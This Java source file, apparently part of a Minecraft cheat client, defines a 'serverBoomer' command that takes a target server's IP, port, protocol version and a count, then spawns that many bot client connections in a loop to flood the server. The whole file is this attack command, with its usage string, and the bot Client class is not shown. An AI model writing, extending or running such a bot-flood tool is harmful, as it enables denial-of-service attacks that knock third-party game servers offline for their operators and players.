package me.shamiko.serverBoomer;

import me.seeking.managers.Command;
import me.seeking.utils.PlayerUtil;

public class Main implements Command {
    @Override
    public boolean run(String[] args) {
        if(args.length == 5){
            try {
                String ip = args[1];
                int port = Integer.parseInt(args[2]);
                int version = Integer.parseInt(args[3]);
                int count = Integer.parseInt(args[4]);

                for (int fk = 0;fk < count;fk++){
                    Client cl = new Client(ip, port, version);
                    PlayerUtil.tellPlayer("Username for bot:"+cl.username);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }else
            return false;
        return false;
    }

    @Override
    public String usage() {
        return "-sb [Server IP] [Port] [Protocol version] [Players]";
    }

    @Override
    public String[] name() {
        return new String[]{"sb", "serverBoomer"};
    }
}
